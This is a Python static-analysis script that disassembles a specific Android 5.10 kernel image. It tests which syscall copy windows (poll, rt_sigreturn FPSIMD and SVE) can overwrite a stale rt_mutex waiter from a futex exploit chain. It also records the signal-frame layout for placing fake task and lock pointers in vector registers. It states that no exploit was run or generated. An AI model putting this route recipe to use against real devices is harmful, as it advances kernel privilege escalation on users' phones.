"""Reproduce the MP6 alternate-route audit (poll + sigreturn families).
Read-only: never communicates with a device. Writes alt-route-audit.json.

Coverage criterion used throughout (distances below the syscall-entry sp):
the stale rt_mutex waiter produced by the futex chain occupies depths
[waiter_depth, waiter_depth+0x40); its task/lock fields sit at
waiter+0x30 / waiter+0x38, i.e. depths [waiter_depth-0x38-8, waiter_depth-0x30).
A copy window whose low-address depth is D and whose user copy length is N
covers depths (D-N .. D]. It covers the fields iff D >= waiter_depth-0x30
and N >= D - (waiter_depth-0x38-8).
"""
from pathlib import Path
import bisect
import hashlib
import json
import re
import sys

OUT = Path(__file__).resolve().parent
ROOT = OUT.parent
sys.path.insert(0, str(ROOT / 'tools' / 'analysis-pydeps'))
from capstone import Cs, CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN

image = (OUT / 'Image').read_bytes()
assert hashlib.sha256(image).hexdigest() == '136177a1c360eb64a8556cb4e6385a06e34c2ceabc05c7da714428837309bf6f'
symbols = json.loads((OUT / 'symbols.json').read_text())
base = symbols['_text'][0]
addresses = sorted({v for vs in symbols.values() for v in vs if base <= v < base + len(image)})
decoder = Cs(CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN)

def instruction(offset, expected):
    item = next(decoder.disasm(image[offset:offset + 4], base + offset))
    actual = f'{item.mnemonic} {item.op_str}'.strip()
    assert actual == expected, (hex(offset), actual, expected)
    return {'image_offset': hex(offset), 'bytes': image[offset:offset + 4].hex(), 'instruction': actual}

def function(name):
    start = symbols[name][0]
    assert len(symbols[name]) == 1
    index = bisect.bisect_right(addresses, start)
    end = addresses[index]
    return list(decoder.disasm(image[start - base:end - base], start))

def frame(name):
    # Reproduce extract_rs/disasm.rs::first_sp_frame on the same function.
    total = 0
    sub_seen = False
    for item in function(name):
        text = f'{item.mnemonic} {item.op_str}'
        found = re.search(r'stp x29, x30, \[sp, #-0x([0-9a-f]+)\]!', text)
        if found:
            total += int(found.group(1), 16)
        found = re.search(r'sub sp, sp, #0x([0-9a-f]+)', text)
        if found and not sub_seen:
            total += int(found.group(1), 16)
            sub_seen = True
    assert total
    return total

# Waiter geometry, same as replay_static_audit.py (futex chain).
futex_names = ['__arm64_sys_futex', 'do_futex', 'futex_wait_requeue_pi']
waiter_local = 0x90
waiter_depth = sum(frame(x) for x in futex_names) - waiter_local
assert waiter_depth == 448
task_field_lo = waiter_depth - 0x38 - 8   # 384: shallow end needed
task_field_hi = waiter_depth - 0x30      # 400: deep end needed

def covered(d_depth, n_bytes):
    return d_depth >= task_field_hi and n_bytes >= d_depth - task_field_lo

# ---- ppoll / do_sys_poll family ------------------------------------------
ppoll_frame = frame('__arm64_sys_ppoll')            # 0x80
poll_frame = frame('do_sys_poll')                   # 0x410 (0x60+0x3b0)
assert ppoll_frame == 0x80 and poll_frame == 0x410
poll_evidence = [
    instruction(0x58460c, 'stp x29, x30, [sp, #-0x60]!'),
    instruction(0x584628, 'sub sp, sp, #0x3b0'),
    instruction(0x5846b8, 'add x8, sp, #0x70'),      # stack poll_list head
    instruction(0x584700, 'add x21, x19, #0xc'),     # entries at walk+0xc
    instruction(0x5846c0, 'mov w9, #0x1e'),          # first chunk min(nfds, 30)
    instruction(0x5846dc, 'csel w21, w21, w9, lo'),
    instruction(0x584704, 'lsl x22, x8, #3'),        # copy = entries*8
    instruction(0x584748, 'add x0, x8, #0x10'),
    instruction(0x584750, 'bl #0xffffffc0104f89ec'), # overflow chunks -> __kmalloc
]
poll_buffer_depth = ppoll_frame + poll_frame - 0x7c  # 1044
poll_copy_max = 30 * 8                               # 240, first chunk only
poll_required = poll_buffer_depth - task_field_lo    # 660: reach lock end at depth 384
assert poll_buffer_depth == 1044 and poll_copy_max == 240
assert not covered(poll_buffer_depth, poll_copy_max)
assert poll_copy_max < poll_required
# ppoll's own timespec copy is far too shallow: depth 104, length 16.
poll_ts_depth = ppoll_frame - 0x18
poll_ts_evidence = [instruction(0x5844a4, 'add x0, sp, #0x18'),
                    instruction(0x5844a8, 'mov w2, #0x10')]
assert not covered(poll_ts_depth, 16)

# ---- rt_sigreturn family -------------------------------------------------
rt_frame = frame('__arm64_sys_rt_sigreturn')        # 0x50
sigframe_frame = frame('restore_sigframe')          # 0x60
fpsimd_frame = frame('restore_fpsimd_context')      # 0x250 (0x30+0x220)
sve_frame = frame('restore_sve_fpsimd_context')     # 0x270 (0x40+0x230)
assert (rt_frame, sigframe_frame, fpsimd_frame, sve_frame) == (0x50, 0x60, 0x250, 0x270)
# parse_user_sigframe allocates via 'str x23, [sp, #-0x30]!' (not matched by
# first_sp_frame); its real frame is 0x30 and it performs no large copies.
parse_evidence = [
    instruction(0x79d08, 'str x23, [sp, #-0x30]!'),
    instruction(0x79d14, 'add x3, x1, #0x250'),      # record chain at sf+0x250
    instruction(0x79d20, 'tst x3, #0xf'),            # 16-byte record alignment
    instruction(0x79fb8, 'cmp w20, #0x210'),         # fpsimd size >= 0x210
    instruction(0x7a080, 'ldr x8, [x15, #0x5e0]'),   # cpu_hwcaps
    instruction(0x7a084, 'tbz w8, #0x10, #0xffffffc010079fb8'),  # !HAS_NO_FPSIMD
    instruction(0x7a05c, 'tbz w8, #0x16, #0xffffffc010079d2c'),  # SVE cap for SVE_MAGIC
    instruction(0x7a600, 'cbnz w20, #0xffffffc010079d2c'),       # END = {0, 0}
]
parse_calls = [f'{i.mnemonic} {i.op_str}' for i in function('parse_user_sigframe')
               if i.mnemonic in ('bl', 'blr')]
assert not parse_calls, parse_calls  # no callee can clobber during record walk

sigframe_order = [
    instruction(0x795ec, 'bl #0xffffffc010155f9c'),  # set_current_blocked (early)
    instruction(0x795fc, 'add x9, x19, #0x138'),     # GPR source sf+0x138
    instruction(0x796ec, 'str x12, [x20, x8]'),      # GPRs straight into pt_regs
    instruction(0x79a2c, 'bl #0xffffffc010079124'),  # valid_user_regs (pre-copy)
    instruction(0x79a48, 'bl #0xffffffc010079d04'),  # parse_user_sigframe (pre-copy)
    instruction(0x79abc, 'bl #0xffffffc01007af88'),  # restore_fpsimd_context = the stamp
    instruction(0x79ac0, 'b #0xffffffc010079a50'),   # post-copy: straight to epilogue
    instruction(0x79c20, 'bl #0xffffffc01007a714'),  # restore_sve_fpsimd_context
]
rt_after = [
    instruction(0x79440, 'mov w2, #0x18'),           # only a 24B stack_t copy after
]

fpsimd_evidence = [
    instruction(0x7af90, 'stp x29, x30, [sp, #-0x30]!'),
    instruction(0x7afa0, 'sub sp, sp, #0x220'),
    instruction(0x7afb0, 'mov x0, sp'),
    instruction(0x7afb4, 'mov w2, #0x210'),          # user_fpsimd_state buffer at sp+0
    instruction(0x7b23c, 'movk w9, #0x4650, lsl #16'),  # FPSIMD_MAGIC = 0x46508001
    instruction(0x7b250, 'cmp x8, #0x210'),          # size must be exactly 0x210
    instruction(0x7b2bc, 'mov x0, sp'),
    instruction(0x7b2c0, 'mov w2, #0x200'),          # vregs[32] copy
    instruction(0x7b3a4, 'str w9, [sp, #0x200]'),    # fpsr
    instruction(0x7b490, 'str w9, [sp, #0x204]'),    # fpcr
]

sig_depth = rt_frame + sigframe_frame + fpsimd_frame   # 768
fpsimd_buffer_depth = sig_depth                        # buffer at callee sp+0
fpsimd_waiter_offset = fpsimd_buffer_depth - waiter_depth  # 320
fpsimd_task_off = fpsimd_waiter_offset + 0x30          # 368 = vregs[23]+0
fpsimd_lock_off = fpsimd_waiter_offset + 0x38          # 376 = vregs[23]+8
assert sig_depth == 768 and fpsimd_waiter_offset == 320
assert fpsimd_task_off == 368 and fpsimd_lock_off == 376
assert fpsimd_task_off % 16 == 0 and fpsimd_lock_off == fpsimd_task_off + 8
assert covered(fpsimd_buffer_depth, 0x200)             # vregs alone cover the fields
assert fpsimd_lock_off + 8 <= 0x200                    # fields fully inside vregs

sve_depth = rt_frame + sigframe_frame + sve_frame      # 800
sve_buffer_depth = sve_depth - 0x10                    # buffer at sp+0x10
sve_waiter_offset = sve_buffer_depth - waiter_depth    # 336
sve_task_off = sve_waiter_offset + 0x30                # 384 = vregs[24]+0
sve_lock_off = sve_waiter_offset + 0x38                # 392 = vregs[24]+8
assert sve_depth == 800 and sve_waiter_offset == 336
assert covered(sve_buffer_depth, 0x200)
assert sve_lock_off + 8 <= 0x200
sve_evidence = [
    instruction(0x7a71c, 'stp x29, x30, [sp, #-0x40]!'),
    instruction(0x7a730, 'sub sp, sp, #0x230'),
    instruction(0x7a740, 'add x0, sp, #0x10'),
    instruction(0x7a744, 'mov w2, #0x210'),
    instruction(0x7a8e8, 'add x0, sp, #0x10'),
    instruction(0x7a8ec, 'mov w2, #0x200'),
    instruction(0x7a9d4, 'str w9, [sp, #0x210]'),
    instruction(0x7ab68, 'str w9, [sp, #0x214]'),
]

report = {
    'release': '5.10.101-android12-9-gece0cc04d1a5',
    'status': 'read-only static analysis, not an importable GhostLock profile',
    'upstream_commit': '67215cfe204940fe71ff67213e76329e1adce7d2',
    'kernel_sha256': hashlib.sha256(image).hexdigest(),
    'criterion': {
        'waiter_depth': waiter_depth,
        'task_field_depths': [task_field_lo, task_field_hi],
        'note': 'copy window [D-N, D] covers task/lock iff D>=400 and N>=D-384'},
    'poll_family': {
        'ppoll_frame': ppoll_frame, 'do_sys_poll_frame': poll_frame,
        'buffer_depth': poll_buffer_depth, 'copy_max': poll_copy_max,
        'required_copy': poll_required,
        'status': 'dead: first stack chunk max 240B at depth 1044 cannot reach depth 384-400; overflow chunks go to kmalloc',
        'timeslot_copy': {'depth': poll_ts_depth, 'len': 16, 'status': 'dead: too shallow'},
        'evidence': poll_evidence + poll_ts_evidence},
    'sigreturn_fpsimd': {
        'chain_frames': [rt_frame, sigframe_frame, fpsimd_frame],
        'buffer_depth': fpsimd_buffer_depth,
        'waiter_offset': fpsimd_waiter_offset,
        'task_offset_in_buffer': fpsimd_task_off,
        'lock_offset_in_buffer': fpsimd_lock_off,
        'task_vreg_index': fpsimd_task_off // 16,
        'user_controlled': {'vregs': 0x200, 'fpsr': 4, 'fpcr': 4},
        'covers_waiter': covered(fpsimd_buffer_depth, 0x200),
        'post_copy_clobber': 'none: restore_fpsimd_context is the last deep call; '
                             'parse_user_sigframe has no callees; rt_sigreturn copies only 24B at depth 56-80',
        'frame_requirements': {
            'align': 16, 'access_ok_size': 0x1250,
            'uc_sigmask': 'sf+0xa8 (8B)', 'gprs': 'sf+0x138..0x230',
            'sp': 'sf+0x230', 'pc': 'sf+0x238', 'pstate': 'sf+0x240 (valid_user_regs)',
            'records': 'sf+0x250, 16B-aligned offsets',
            'record_chain': 'fpsimd{magic=0x46508001,size=0x210,fpsr,fpcr,vregs[32]} then END{0,0}',
            'vregs23': 'bytes 384..400 of the record vregs = {fake_task, fake_lock}'},
        'gate': 'cpu_hwcaps bit 0x10 = ARM64_HAS_NO_FPSIMD must be clear (true for SM8450); '
                'bit 0x16 = ARM64_SVE only matters for the SVE variant; bit 4 = ARM64_HAS_PAN is the copy-helper gate. '
                'Indices from AOSP android12-5.10 arch/arm64/include/asm/cpucaps.h.',
        'evidence': sigframe_order + rt_after + fpsimd_evidence + parse_evidence},
    'sigreturn_sve': {
        'chain_frames': [rt_frame, sigframe_frame, sve_frame],
        'buffer_depth': sve_buffer_depth,
        'waiter_offset': sve_waiter_offset,
        'task_offset_in_buffer': sve_task_off,
        'lock_offset_in_buffer': sve_lock_off,
        'task_vreg_index': sve_task_off // 16,
        'covers_waiter': covered(sve_buffer_depth, 0x200),
        'status': 'secondary: requires cpu_hwcaps bit 0x16 (ARM64_SVE); more frame constraints '
                  '(SVE vq consistency, header copy); zregs go to heap/current, not the stack window',
        'evidence': sve_evidence},
    'limits': [
        'Static analysis only; no code was installed or run on any phone.',
        'No working exploit profile was generated; a new route implementation is L-class work needing a plan review first.',
        'Frame construction (pc/sp continuation, sigmask, race timing with the consumer thread) is not device-validated.']}
(OUT / 'alt-route-audit.json').write_text(json.dumps(report, indent=2), encoding='utf-8')
print(json.dumps({'poll': {'D': poll_buffer_depth, 'N': poll_copy_max, 'need': poll_required},
                  'sigreturn_fpsimd': {'D': fpsimd_buffer_depth, 'waiter_off': fpsimd_waiter_offset,
                                       'task_vreg': fpsimd_task_off // 16, 'covers': True},
                  'sigreturn_sve': {'D': sve_buffer_depth, 'waiter_off': sve_waiter_offset,
                                    'task_vreg': sve_task_off // 16, 'covers': True},
                  'parse_calls': parse_calls}, indent=2))
